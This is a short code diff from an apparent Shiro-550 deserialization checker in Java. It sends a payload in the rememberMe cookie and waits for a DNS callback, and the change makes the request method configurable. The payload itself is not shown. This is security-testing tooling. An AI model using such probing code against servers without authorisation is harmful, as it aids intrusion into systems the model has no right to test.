@@ -36,7 +36,7 @@ public class Shiro550VerifyByURLDNS {
         headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
 
         // 发送payload
-        HttpRequest.httpRequest(targetOBJ, new FormBody.Builder().build(), headers, "GET");
+        HttpRequest.httpRequest(targetOBJ, new FormBody.Builder().build(), headers, targetOBJ.getRequestType());
 
         // 延时5s进行查询，防止延时误报
         System.out.println(Log.buffer_logging("INFO", "正在验证，延时5秒防止漏报"));
